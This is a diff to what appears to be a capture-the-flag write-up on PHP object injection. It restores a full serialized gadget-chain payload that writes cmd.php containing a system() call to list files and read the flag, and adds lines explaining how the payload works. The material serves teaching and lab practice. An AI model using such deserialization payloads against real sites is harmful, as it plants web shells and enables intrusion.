@@ -131,7 +131,10 @@ We can see that the `Song` class is the one that initiates the entire class call
 
 Let's put all the pieces together to create the payload as a one big serialized object:
 
-`O:6:"Lyrics":2:{s:9:"*lyrics";s:12:"shell_lyrics";s:7:"*song";O:4:"Song":4:{s:9:"*logger";O:6:"Logger":1:{s:12:"*logwriter";O:14:"LogWriter_File":2:{s:11:"*filename";s:7:"cmd.php";s:9:"*format";O:13:"LogFileFormat":2:{s:10:"*filters";a:1:{i:0;O:12:"OutputFilter":2:{s:15:"*matchPattern";s:19:"/\[i\](.*)\[\/i\]/i";s:14:"*replacement";s:9:"\1";}}s:7:"*endl";s:1:" ";}}}s:7:"*name";s:35:"";s:8:"*group";s:11:"shell_group";s:6:"*url";s:19:"https:\/\/shell.com";}}`
+`O:6:"Lyrics":2:{s:9:"*lyrics";s:12:"shell_lyrics";s:7:"*song";O:4:"Song":4:{s:9:"*logger";O:6:"Logger":1:{s:12:"*logwriter";O:14:"LogWriter_File":2:{s:11:"*filename";s:7:"cmd.php";s:9:"*format";O:13:"LogFileFormat":2:{s:10:"*filters";a:1:{i:0;O:12:"OutputFilter":2:{s:15:"*matchPattern";s:19:"/\[i\](.*)\[\/i\]/i";s:14:"*replacement";s:9:"<i>\1</i>";}}s:7:"*endl";s:1:"
+";}}}s:7:"*name";s:35:"<?php system('ls -l; cat flag'); ?>";s:8:"*group";s:11:"shell_group";s:6:"*url";s:19:"https:\/\/shell.com";}}`
+
+Take note of the line `s:11:"*filename";s:7:"cmd.php";` which represents our malicious filename with a `.php` extension, and the line `s:7:"*name";s:35:"<?php system('ls -l; cat flag'); ?>";` which represents our PHP `system()` function to execute shell commands.
 
 The final serialized payload to be injected as a HTTP POST parameter in base64 format wil follow:
 
